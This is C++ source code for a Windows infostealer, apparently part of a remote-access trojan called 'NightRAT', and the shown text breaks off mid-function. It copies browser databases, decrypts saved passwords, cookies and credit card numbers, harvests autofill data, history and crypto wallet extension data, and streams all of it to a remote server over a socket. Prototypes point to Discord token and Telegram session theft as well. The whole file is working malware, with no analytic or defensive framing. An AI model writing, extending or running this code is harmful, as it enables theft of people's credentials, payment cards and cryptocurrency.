#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <vector>
#include <string>
#include <filesystem>
#include <fstream>
#include <algorithm>
#include <memory>
#include <cstring>
#include <map>
#include <set>
#include <regex>
#include <cstdio>
#include <sstream>
#include <iomanip>
#include <ctime>
#include <cctype>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")

namespace fs = std::filesystem;

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_RECOVERY_FILE = 0x07;

struct InterceptPoint {
    size_t address = 0;
    int reg_index = -1;
};

struct BrowserConfig {
    std::string name;
    std::string process_name;
    std::vector<std::wstring> exe_paths;
    std::string dll_name;
    std::vector<std::wstring> user_data_subdir;
    std::string output_dir;
    std::string temp_prefix;
    bool use_r14;
    bool use_roaming;
    bool has_abe;
    bool is_firefox;
};

// Function prototypes
std::string to_narrow_string(const wchar_t* w_str);
std::wstring utf8_to_wstring(const std::string& str);
static void send_status(SOCKET sock, const std::string& msg);
std::vector<uint8_t> debug_loop_get_key(SOCKET sock, uint32_t process_id, const BrowserConfig& config);
InterceptPoint find_target_address(HANDLE h_process, void* base_addr, const std::string& browser_name);
void extract_all_profiles_data(SOCKET sock, const std::vector<uint8_t>& v20_key, const BrowserConfig& config, const std::wstring& user_data_dir);
void extract_firefox_data(SOCKET sock, const BrowserConfig& config, const std::wstring& user_data_dir);
void extract_discord_tokens(SOCKET sock, const std::wstring& discord_path_w, const std::string& output_name);
void extract_telegram_session(SOCKET sock);
bool get_v10_key(const std::wstring& user_data_dir, std::vector<uint8_t>& key, bool& is_dpapi);

static void send_with_mutex(SOCKET sock, const char* data, int len) {
    HANDLE hMutex = OpenMutexW(MUTEX_ALL_ACCESS, FALSE, L"Global\\NightRAT_Socket_Mutex");
    if (hMutex) WaitForSingleObject(hMutex, INFINITE);

    int remaining = len;
    const char* p = data;
    while (remaining > 0) {
        int sent = send(sock, p, remaining, 0);
        if (sent <= 0) break;
        p += sent;
        remaining -= sent;
    }

    if (hMutex) {
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
    }
}

static void send_status(SOCKET sock, const std::string& msg) {
    if (sock == INVALID_SOCKET) return;
    std::string json_msg = "{\"action\":\"recovery_status\",\"message\":\"" + msg + "\"}\r\n";
    send_with_mutex(sock, json_msg.c_str(), (int)json_msg.size());
}

static void send_data_in_chunks(SOCKET sock, const std::string& relPath, const uint8_t* data, size_t data_size) {
    if (sock == INVALID_SOCKET) return;
    const size_t CHUNK_SIZE = 1024 * 1024; // 1MB chunks
    size_t total_sent = 0;
    do {
        size_t current_chunk = (data_size - total_sent > CHUNK_SIZE) ? CHUNK_SIZE : (data_size - total_sent);
        uint32_t pathLen = (uint32_t)relPath.size();
        uint32_t totalSize = sizeof(uint32_t) + pathLen + (uint32_t)current_chunk;
        std::vector<uint8_t> packet(sizeof(PacketHeader) + totalSize);
        PacketHeader* header = (PacketHeader*)packet.data();
        header->signature = PACKET_SIGNATURE;
        header->type = PACKET_TYPE_RECOVERY_FILE;
        header->size = totalSize;
        uint8_t* ptr = packet.data() + sizeof(PacketHeader);
        *(uint32_t*)ptr = pathLen;
        ptr += sizeof(uint32_t);
        memcpy(ptr, relPath.c_str(), pathLen);
        ptr += pathLen;
        if (current_chunk > 0) memcpy(ptr, data + total_sent, current_chunk);
        send_with_mutex(sock, (const char*)packet.data(), (int)packet.size());
        total_sent += current_chunk;
    } while (total_sent < data_size);
}

static void send_string_to_server(SOCKET sock, const std::string& relPath, const std::string& data) {
    if (data.empty()) return;
    send_data_in_chunks(sock, relPath, (const uint8_t*)data.data(), data.size());
}

static void send_file_from_disk(SOCKET sock, const fs::path& filePath, const std::string& relPath) {
    std::ifstream ifs(filePath, std::ios::binary);
    if (!ifs) return;
    const size_t CHUNK_SIZE = 1024 * 1024;
    std::vector<uint8_t> buffer(CHUNK_SIZE);
    while (ifs) {
        ifs.read((char*)buffer.data(), CHUNK_SIZE);
        std::streamsize bytes_read = ifs.gcount();
        if (bytes_read > 0) send_data_in_chunks(sock, relPath, buffer.data(), (size_t)bytes_read);
    }
}

void send_directory_recursively(SOCKET sock, const fs::path& source_dir, const std::string& server_path_prefix) {
    if (!fs::exists(source_dir)) return;
    std::error_code ec;
    for (const auto& entry : fs::recursive_directory_iterator(source_dir, ec)) {
        if (ec) break;
        if (entry.is_regular_file()) {
            std::string rel = fs::relative(entry.path(), source_dir).string();
            std::replace(rel.begin(), rel.end(), '\\', '/');
            send_file_from_disk(sock, entry.path(), server_path_prefix + "/" + rel);
        }
    }
}

std::string to_narrow_string(const wchar_t* w_str) {
    if (!w_str) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, w_str, -1, NULL, 0, NULL, NULL);
    if (size <= 0) return "";
    std::string res(size, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w_str, -1, &res[0], size, NULL, NULL);
    if (!res.empty() && res.back() == '\0') res.pop_back();
    return res;
}

std::wstring utf8_to_wstring(const std::string& str) {
    if (str.empty()) return L"";
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    if (size <= 0) return L"";
    std::wstring res(size, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &res[0], size);
    if (!res.empty() && res.back() == L'\0') res.pop_back();
    return res;
}

std::string json_escape(const std::string& s) {
    std::ostringstream oss;
    for (auto c : s) {
        switch (c) {
        case '"': oss << "\\\""; break;
        case '\\': oss << "\\\\"; break;
        case '\b': oss << "\\b"; break;
        case '\f': oss << "\\f"; break;
        case '\n': oss << "\\n"; break;
        case '\r': oss << "\\r"; break;
        case '\t': oss << "\\t"; break;
        default:
            if ('\x00' <= (unsigned char)c && (unsigned char)c <= '\x1f') {
                oss << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)(unsigned char)c;
            } else {
                oss << c;
            }
        }
    }
    return oss.str();
}

std::string path_to_uri(const fs::path& p) {
    std::string path_str = to_narrow_string(p.wstring().c_str());
    std::string encoded = "";
    for (unsigned char c : path_str) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~' || c == '/' || c == ':') {
            encoded += (char)c;
        } else if (c == '\\') {
            encoded += '/';
        } else {
            char buf[4];
            snprintf(buf, sizeof(buf), "%%%02X", c);
            encoded += buf;
        }
    }
    return "file:///" + encoded + "?mode=ro&nolock=1&immutable=1";
}

std::string format_timestamp(double ts) {
    if (ts <= 0) return "";
    time_t t = (time_t)ts;
    struct tm tm_buf;
#ifdef _WIN32
    gmtime_s(&tm_buf, &t);
#else
    gmtime_r(&t, &tm_buf);
#endif
    char buf[64];
    strftime(buf, sizeof(buf), "%d-%m-%Y %H:%M:%S", &tm_buf);
    return std::string(buf);
}

std::string to_lower(std::string s) {
    std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c) { return std::tolower(c); });
    return s;
}

#include "includes/sqlite3.h"

static sqlite3* copy_to_temp_and_open_db(const fs::path& db_path) {
    if (!fs::exists(db_path)) return nullptr;
    try {
        wchar_t temp_path[MAX_PATH];
        GetTempPathW(MAX_PATH, temp_path);
        wchar_t temp_file[MAX_PATH];
        GetTempFileNameW(temp_path, L"rat", 0, temp_file);

        std::error_code ec;
        fs::copy_file(db_path, temp_file, fs::copy_options::overwrite_existing, ec);

        sqlite3* db = nullptr;
        std::string uri = path_to_uri(temp_file);
        if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
            return db;
        }
        if (db) sqlite3_close(db);
        fs::remove(temp_file, ec);
    } catch (...) {}
    return nullptr;
}

static void close_and_delete_db(sqlite3* db) {
    if (!db) return;
    std::string db_file = sqlite3_db_filename(db, "main");
    sqlite3_close(db);
    if (!db_file.empty()) {
        std::error_code ec;
        fs::remove(db_file, ec);
    }
}

struct WalletMetadata {
    std::string name;
    std::string chromium_id;
    std::string firefox_keyword;
};

static std::vector<WalletMetadata> target_wallets = {
    {"metamask", "nkbihfbeogaeaoehlefnkodbefgpgknn", "metamask"},
    {"trustwallet", "egjidjbpglichdcondbcbdnbeeppgdph", "trust wallet"},
    {"coinbasewallet", "hnfanknocfeofbddgcijnmhnfnkdnaad", "coinbase wallet"}
};

std::vector<uint8_t> base64_decode(const std::string& input) {
    DWORD out_len = 0;
    if (CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, NULL, &out_len, NULL, NULL)) {
        std::vector<uint8_t> out(out_len);
        if (CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, out.data(), &out_len, NULL, NULL)) return out;
    }
    return {};
}

std::vector<uint8_t> decrypt_aes_gcm(const std::vector<uint8_t>& key, const std::vector<uint8_t>& nonce, const std::vector<uint8_t>& ciphertext) {
    BCRYPT_ALG_HANDLE h_alg = NULL; BCRYPT_KEY_HANDLE h_key = NULL; std::vector<uint8_t> plaintext;
    if (BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_AES_ALGORITHM, NULL, 0) == 0) {
        if (BCryptSetProperty(h_alg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) == 0) {
            if (BCryptGenerateSymmetricKey(h_alg, &h_key, NULL, 0, (BYTE*)key.data(), (ULONG)key.size(), 0) == 0) {
                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info; BCRYPT_INIT_AUTH_MODE_INFO(auth_info);
                if (ciphertext.size() > 16) {
                    std::vector<uint8_t> actual_ciphertext(ciphertext.begin(), ciphertext.end() - 16);
                    std::vector<uint8_t> tag(ciphertext.end() - 16, ciphertext.end());
                    auth_info.pbNonce = (BYTE*)nonce.data(); auth_info.cbNonce = (ULONG)nonce.size(); auth_info.pbTag = tag.data(); auth_info.cbTag = (ULONG)tag.size();
                    DWORD out_len = 0;
                    if (BCryptDecrypt(h_key, (BYTE*)actual_ciphertext.data(), (ULONG)actual_ciphertext.size(), &auth_info, NULL, 0, NULL, 0, &out_len, 0) == 0) {
                        plaintext.resize(out_len);
                        if (BCryptDecrypt(h_key, (BYTE*)actual_ciphertext.data(), (ULONG)actual_ciphertext.size(), &auth_info, NULL, 0, plaintext.data(), (ULONG)plaintext.size(), &out_len, 0) != 0) plaintext.clear();
                    }
                }
            }
        }
    }
    if (h_key) BCryptDestroyKey(h_key); if (h_alg) BCryptCloseAlgorithmProvider(h_alg, 0); return plaintext;
}

bool is_mostly_printable(const std::vector<uint8_t>& data) {
    if (data.empty()) return true; size_t printable = 0;
    for (uint8_t b : data) if ((b >= 32 && b <= 126) || b == '\r' || b == '\n' || b == '\t') printable++;
    return (double)printable / data.size() > 0.8;
}

std::vector<uint8_t> decrypt_blob(const std::vector<uint8_t>& blob, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera) {
    if (blob.empty()) return {};
    if (blob.size() > 15 && (memcmp(blob.data(), "v10", 3) == 0 || memcmp(blob.data(), "v20", 3) == 0)) {
        std::vector<uint8_t> nonce(blob.begin() + 3, blob.begin() + 15);
        std::vector<uint8_t> ciphertext(blob.begin() + 15, blob.end());
        auto try_decrypt = [&](const std::vector<uint8_t>& key) -> std::vector<uint8_t> {
            if (key.empty()) return {};
            std::vector<uint8_t> dec = decrypt_aes_gcm(key, nonce, ciphertext);
            if (!dec.empty()) {
                if (dec.size() > 32) {
                    std::vector<uint8_t> header(dec.begin(), dec.begin() + 32);
                    if (is_opera || !is_mostly_printable(header)) return std::vector<uint8_t>(dec.begin() + 32, dec.end());
                }
                return dec;
            }
            return {};
        };
        std::vector<uint8_t> res = try_decrypt(memcmp(blob.data(), "v20", 3) == 0 ? v20_key : v10_key);
        if (res.empty()) res = try_decrypt(v10_key);
        if (res.empty()) res = try_decrypt(v20_key);
        return res;
    } else if (blob.size() > 15) {
        DATA_BLOB input = { (DWORD)blob.size(), (BYTE*)blob.data() }; DATA_BLOB output = { 0, NULL };
        if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
            std::vector<uint8_t> dec(output.pbData, output.pbData + output.cbData); LocalFree(output.pbData); return dec;
        }
    }
    return {};
}

void extract_passwords(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera) {
    std::vector<std::string> db_names = {"Login Data", "Login Data For Account", "Ya Passman Data"};
    sqlite3* db = nullptr;
    for (const auto& name : db_names) {
        db = copy_to_temp_and_open_db(profile_path / name);
        if (db) break;
    }
    if (!db) return;

    sqlite3_stmt* stmt; const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        std::ostringstream oss_txt, oss_json;
        oss_json << "[\n"; bool first = true;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* url = (const char*)sqlite3_column_text(stmt, 0);
            const char* user = (const char*)sqlite3_column_text(stmt, 1);
            const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 2);
            int blob_size = sqlite3_column_bytes(stmt, 2);
            std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(blob_ptr, blob_ptr + blob_size), v10_key, v20_key, is_opera);
            if (!dec.empty()) {
                std::string str_url = url ? url : "";
                std::string str_user = user ? user : "";
                std::string str_pass = std::string(dec.begin(), dec.end());
                oss_txt << "URL: " << str_url << "\nUser: " << str_user << "\nPass: " << str_pass << "\n---\n";
                if (!first) oss_json << ",\n";
                oss_json << "    {\n";
                oss_json << "        \"url\": \"" << json_escape(str_url) << "\",\n";
                oss_json << "        \"username\": \"" << json_escape(str_user) << "\",\n";
                oss_json << "        \"password\": \"" << json_escape(str_pass) << "\"\n";
                oss_json << "    }";
                first = false;
            }
        }
        oss_json << "\n]";
        sqlite3_finalize(stmt);
        send_string_to_server(sock, out_prefix + "/passwords.txt", oss_txt.str());
        send_string_to_server(sock, out_prefix + "/passwords.json", oss_json.str());
    }
    close_and_delete_db(db);
}

void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera, const std::string& browser_name, const std::string& profile_name) {
    sqlite3* db = copy_to_temp_and_open_db(profile_path / "Network" / "Cookies");
    if (!db) db = copy_to_temp_and_open_db(profile_path / "Cookies");
    if (!db) return;

    sqlite3_stmt* stmt; const char* sql = "SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, samesite FROM cookies";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        std::ostringstream oss_txt, oss_json;
        oss_json << "[\n"; bool first = true;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* host = (const char*)sqlite3_column_text(stmt, 0);
            const char* name = (const char*)sqlite3_column_text(stmt, 1);
            const char* value = (const char*)sqlite3_column_text(stmt, 2);
            const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 3);
            int blob_size = sqlite3_column_bytes(stmt, 3);
            const char* path = (const char*)sqlite3_column_text(stmt, 4);
            long long expires_utc = sqlite3_column_int64(stmt, 5);
            int secure = sqlite3_column_int(stmt, 6);
            int httponly = sqlite3_column_int(stmt, 7);
            int samesite = sqlite3_column_int(stmt, 8);

            std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(blob_ptr, blob_ptr + blob_size), v10_key, v20_key, is_opera);
            std::string cookie_val = !dec.empty() ? std::string(dec.begin(), dec.end()) : (value ? value : "");
            if (!cookie_val.empty()) {
                std::string str_name = name ? name : "";
                std::string str_host = host ? host : "";
                std::string str_path = path ? path : "";
                double expirationDate = (expires_utc > 0) ? ((double)(expires_utc - 11644473600000000ULL) / 1000000.0) : 0;

                oss_txt << str_name << "=" << cookie_val << ";\n";
                if (!first) oss_json << ",\n";

                bool hostOnly = (str_host.size() > 0 && str_host[0] != '.');
                std::string expires_raw_str;
                {
                    std::ostringstream ss_exp;
                    ss_exp << std::fixed << std::setprecision(3) << expirationDate;
                    expires_raw_str = ss_exp.str();
                    while (!expires_raw_str.empty() && expires_raw_str.back() == '0') expires_raw_str.pop_back();
                    if (!expires_raw_str.empty() && expires_raw_str.back() == '.') expires_raw_str.pop_back();
                }

                oss_json << "{\n";
                oss_json << "	\"Host raw\": \"" << (secure ? "https://" : "http://") << json_escape(str_host) << "/\",\n";
                oss_json << "	\"Name raw\": \"" << json_escape(str_name) << "\",\n";
                oss_json << "	\"Path raw\": \"" << json_escape(str_path) << "\",\n";
                oss_json << "	\"Content raw\": \"" << json_escape(cookie_val) << "\",\n";
                oss_json << "	\"Expires\": \"" << format_timestamp(expirationDate) << "\",\n";
                oss_json << "	\"Expires raw\": \"" << expires_raw_str << "\",\n";
                oss_json << "	\"Send for\": \"" << (secure ? "Encrypted connections only" : "Any type of connection") << "\",\n";
                oss_json << "	\"Send for raw\": \"" << (secure ? "true" : "false") << "\",\n";
                oss_json << "	\"HTTP only raw\": \"" << (httponly ? "true" : "false") << "\",\n";
                const char* ss = "unspecified";
                if (samesite == 0) ss = "no_restriction"; else if (samesite == 1) ss = "lax"; else if (samesite == 2) ss = "strict";
                oss_json << "	\"SameSite raw\": \"" << ss << "\",\n";
                oss_json << "	\"This domain only\": \"" << (hostOnly ? "Valid for host only" : "Valid for subdomains") << "\",\n";
                oss_json << "	\"This domain only raw\": \"" << (hostOnly ? "true" : "false") << "\",\n";
                oss_json << "	\"First Party Domain\": \"\"\n";
                oss_json << "}";
                first = false;
            }
        }
        oss_json << "\n]";
        sqlite3_finalize(stmt);
        send_string_to_server(sock, out_prefix + "/cookies.txt", oss_txt.str());
        send_string_to_server(sock, out_prefix + "/cookies.json", oss_json.str());
    }
    close_and_delete_db(db);
}

void extract_autofill(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera) {
    std::vector<std::string> db_names = {"Web Data", "Ya Autofill Data", "Ya Credit Cards"};
    std::ostringstream oss_txt, oss_json;
    oss_json << "[\n"; bool first = true;
    for (const auto& db_name : db_names) {
        sqlite3* db = copy_to_temp_and_open_db(profile_path / db_name);
        if (db) {
            sqlite3_stmt* stmt;
            if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, NULL) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    const char* name = (const char*)sqlite3_column_text(stmt, 0);
                    const char* value = (const char*)sqlite3_column_text(stmt, 1);
                    std::string str_name = name ? name : "";
                    std::string str_val = value ? value : "";
                    oss_txt << "Form: " << str_name << " = " << str_val << "\n";
                    if (!first) oss_json << ",\n";
                    oss_json << "    {\n";
                    oss_json << "        \"type\": \"form\",\n";
                    oss_json << "        \"name\": \"" << json_escape(str_name) << "\",\n";
                    oss_json << "        \"value\": \"" << json_escape(str_val) << "\"\n";
                    oss_json << "    }";
                    first = false;
                }
                sqlite3_finalize(stmt);
            }
            const char* tables[] = {"autofill_profile_names", "autofill_profile_emails", "autofill_profile_phones"};
            for (const char* table : tables) {
                std::string col = strstr(table, "name") ? "first_name" : (strstr(table, "email") ? "email" : "number");
                std::string sql = "SELECT guid, " + col + " FROM " + table;
                if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* guid = (const char*)sqlite3_column_text(stmt, 0);
                        const char* val = (const char*)sqlite3_column_text(stmt, 1);
                        std::string str_guid = guid ? guid : "";
                        std::string str_val = val ? val : "";
                        oss_txt << table << " (" << str_guid << "): " << str_val << "\n";
                        if (!first) oss_json << ",\n";
                        oss_json << "    {\n";
                        oss_json << "        \"type\": \"" << json_escape(table) << "\",\n";
                        oss_json << "        \"guid\": \"" << json_escape(str_guid) << "\",\n";
                        oss_json << "        \"value\": \"" << json_escape(str_val) << "\"\n";
                        oss_json << "    }";
                        first = false;
                    }
                    sqlite3_finalize(stmt);
                }
            }
            if (sqlite3_prepare_v2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, NULL) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    const char* name = (const char*)sqlite3_column_text(stmt, 0);
                    int m = sqlite3_column_int(stmt, 1);
                    int y = sqlite3_column_int(stmt, 2);
                    const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 3);
                    int blob_size = sqlite3_column_bytes(stmt, 3);
                    std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(blob_ptr, blob_ptr + blob_size), v10_key, v20_key, is_opera);
                    if (!dec.empty()) {
                        std::string str_name = name ? name : "";
                        std::string str_num = std::string(dec.begin(), dec.end());
                        oss_txt << "Card: " << str_name << " | Exp: " << m << "/" << y << " | Num: " << str_num << "\n";
                        if (!first) oss_json << ",\n";
                        oss_json << "    {\n";
                        oss_json << "        \"type\": \"card\",\n";
                        oss_json << "        \"name\": \"" << json_escape(str_name) << "\",\n";
                        oss_json << "        \"expiry\": \"" << std::to_string(m) << "/" << std::to_string(y) << "\",\n";
                        oss_json << "        \"number\": \"" << json_escape(str_num) << "\"\n";
                        oss_json << "    }";
                        first = false;
                    }
                }
                sqlite3_finalize(stmt);
            }
            close_and_delete_db(db);
        }
    }
    oss_json << "\n]";
    send_string_to_server(sock, out_prefix + "/autofill.txt", oss_txt.str());
    send_string_to_server(sock, out_prefix + "/autofill.json", oss_json.str());
}

void extract_history(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix) {
    sqlite3* db = copy_to_temp_and_open_db(profile_path / "History");
    if (!db) return;

    sqlite3_stmt* stmt; const char* sql = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        std::ostringstream oss_txt, oss_json;
        oss_json << "[\n"; bool first = true;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* url = (const char*)sqlite3_column_text(stmt, 0);
            const char* title = (const char*)sqlite3_column_text(stmt, 1);
            int count = sqlite3_column_int(stmt, 2);
            long long last_visit = sqlite3_column_int64(stmt, 3);
            std::string str_url = url ? url : "";
            std::string str_title = title ? title : "";
            oss_txt << "URL: " << str_url << " | Title: " << str_title << " | Visits: " << count << "\n";
            if (!first) oss_json << ",\n";
            oss_json << "    {\n";
            oss_json << "        \"url\": \"" << json_escape(str_url) << "\",\n";
            oss_json << "        \"title\": \"" << json_escape(str_title) << "\",\n";
            oss_json << "        \"visit_count\": " << count << ",\n";
            oss_json << "        \"last_visit_time\": " << last_visit << "\n";
            oss_json << "    }";
            first = false;
        }
        oss_json << "\n]";
        sqlite3_finalize(stmt);
        send_string_to_server(sock, out_prefix + "/history.txt", oss_txt.str());
        send_string_to_server(sock, out_prefix + "/history.json", oss_json.str());
    }
    close_and_delete_db(db);
}

void extract_chromium_wallets(SOCKET sock, const fs::path& profile_path, const std::string& browser_name, const std::string& profile_name) {
    std::string safe_browser = to_lower(browser_name);
    std::replace(safe_browser.begin(), safe_browser.end(), ' ', '_');

    for (const auto& wallet : target_wallets) {
        if (wallet.chromium_id.empty()) continue;

        std::string wallet_prefix = "wallets/" + wallet.name + "_" + safe_browser + "/" + profile_name;

        fs::path settings_path = profile_path / "Local Extension Settings" / wallet.chromium_id;
        if (fs::exists(settings_path)) {
            send_directory_recursively(sock, settings_path, wallet_prefix + "/Local Extension Settings");
        }

        fs::path state_path = profile_path / "Extension State" / wallet.chromium_id;
        if (fs::exists(state_path)) {
            send_directory_recursively(sock, state_path, wallet_prefix + "/Extension State");
        }

        fs::path idb_path = profile_path / "IndexedDB" / ("chrome-extension_" + wallet.chromium_id + "_0.indexeddb.leveldb");
        if (fs::exists(idb_path)) {
            send_directory_recursively(sock, idb_path, wallet_prefix + "/IndexedDB");
        }
    }
}

void extract_all_profiles_data(SOCKET sock, const std::vector<uint8_t>& v20_key, const BrowserConfig& config, const std::wstring& user_data_dir) {
    std::vector<uint8_t> v10_key; bool is_dpapi = false; get_v10_key(user_data_dir, v10_key, is_dpapi);
    fs::path user_data(user_data_dir); bool is_opera = config.name.find("Opera") != std::string::npos || config.name.find("Yandex") != std::string::npos;

    auto process_profile = [&](const fs::path& profile_path) {
        bool is_profile = fs::exists(profile_path / "Preferences") ||
                         fs::exists(profile_path / "Web Data") ||
                         fs::exists(profile_path / "Login Data") ||
                         fs::exists(profile_path / "Cookies") ||
                         fs::exists(profile_path / "Network" / "Cookies") ||
                         fs::exists(profile_path / "Ya Passman Data");

        if (is_profile) {
            std::string profile_name = profile_path.filename().string();
            if (profile_name == "User Data" || profile_name == "EBWebView") profile_name = "RootProfile";

            std::string out_prefix = config.output_dir + "/" + profile_name;
            extract_passwords(sock, profile_path, out_prefix, v10_key, v20_key, is_opera);
            extract_cookies(sock, profile_path, out_prefix, v10_key, v20_key, is_opera, config.name, profile_name);
            extract_autofill(sock, profile_path, out_prefix, v10_key, v20_key, is_opera);
            extract_history(sock, profile_path, out_prefix);
            extract_chromium_wallets(sock, profile_path, config.name, profile_name);
        }
    };

    process_profile(user_data);

    std::error_code ec;
    for (const auto& entry : fs::directory_iterator(user_data, ec)) {
        if (ec) break;
        try {
            if (entry.is_directory()) {
                process_profile(entry.path());
            }
        } catch (...) {}
    }
}

void extract_firefox_cookies(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::string& browser_name, const std::string& profile_name) {
    sqlite3* db = copy_to_temp_and_open_db(profile_path / "cookies.sqlite");
    if (!db) return;

    sqlite3_stmt* stmt; const char* sql = "SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        std::ostringstream oss_txt, oss_json;
        oss_json << "[\n"; bool first = true;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* host = (const char*)sqlite3_column_text(stmt, 0);
            const char* name = (const char*)sqlite3_column_text(stmt, 1);
            const char* value = (const char*)sqlite3_column_text(stmt, 2);
            const char* path = (const char*)sqlite3_column_text(stmt, 3);
            long long expiry = sqlite3_column_int64(stmt, 4);
            int secure = sqlite3_column_int(stmt, 5);
            int httponly = sqlite3_column_int(stmt, 6);
            int samesite = sqlite3_column_int(stmt, 7);

            std::string str_name = name ? name : "";
            std::string str_val = value ? value : "";
            std::string str_host = host ? host : "";
            std::string str_path = path ? path : "";

            oss_txt << str_name << "=" << str_val << ";\n";
            if (!first) oss_json << ",\n";

            bool hostOnly = (str_host.size() > 0 && str_host[0] != '.');
            double expirationDate = (double)expiry;
            std::string expires_raw_str;
            {
                std::ostringstream ss_exp;
                ss_exp << std::fixed << std::setprecision(3) << expirationDate;
                expires_raw_str = ss_exp.str();
                while (!expires_raw_str.empty() && expires_raw_str.back() == '0') expires_raw_str.pop_back();
                if (!expires_raw_str.empty() && expires_raw_str.back() == '.') expires_raw_str.pop_back();
            }

            oss_json << "{\n";
            oss_json << "	\"Host raw\": \"" << (secure ? "https://" : "http://") << json_escape(str_host) << "/\",\n";
            oss_json << "	\"Name raw\": \"" << json_escape(str_name) << "\",\n";
            oss_json << "	\"Path raw\": \"" << json_escape(str_path) << "\",\n";
            oss_json << "	\"Content raw\": \"" << json_escape(str_val) << "\",\n";
            oss_json << "	\"Expires\": \"" << format_timestamp(expirationDate) << "\",\n";
            oss_json << "	\"Expires raw\": \"" << expires_raw_str << "\",\n";
            oss_json << "	\"Send for\": \"" << (secure ? "Encrypted connections only" : "Any type of connection") << "\",\n";
            oss_json << "	\"Send for raw\": \"" << (secure ? "true" : "false") << "\",\n";
            oss_json << "	\"HTTP only raw\": \"" << (httponly ? "true" : "false") << "\",\n";
            const char* ss = "unspecified";
            if (samesite == 1) ss = "lax"; else if (samesite == 2) ss = "strict"; else if (samesite == 0) ss = "no_restriction";
            oss_json << "	\"SameSite raw\": \"" << ss << "\",\n";
            oss_json << "	\"This domain only\": \"" << (hostOnly ? "Valid for host only" : "Valid for subdomains") << "\",\n";
            oss_json << "	\"This domain only raw\": \"" << (hostOnly ? "true" : "false") << "\",\n";
            oss_json << "	\"Store raw\": \"" << to_lower(browser_name + "-" + profile_name) << "\",\n";
            oss_json << "	\"First Party Domain\": \"\"\n";
            oss_json << "}";
            first = false;
        }
        oss_json << "\n]";
        sqlite3_finalize(stmt);
        send_string_to_server(sock, out_prefix + "/cookies.txt", oss_txt.str());
        send_string_to_server(sock, out_prefix + "/cookies.json", oss_json.str());
    }
    close_and_delete_db(db);
}

void extract_firefox_history(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix) {
    sqlite3* db = copy_to_temp_and_open_db(profile_path / "places.sqlite");
    if (!db) return;

    sqlite3_stmt* stmt; const char* sql = "SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 100";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        std::ostringstream oss_txt, oss_json;
        oss_json << "[\n"; bool first = true;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
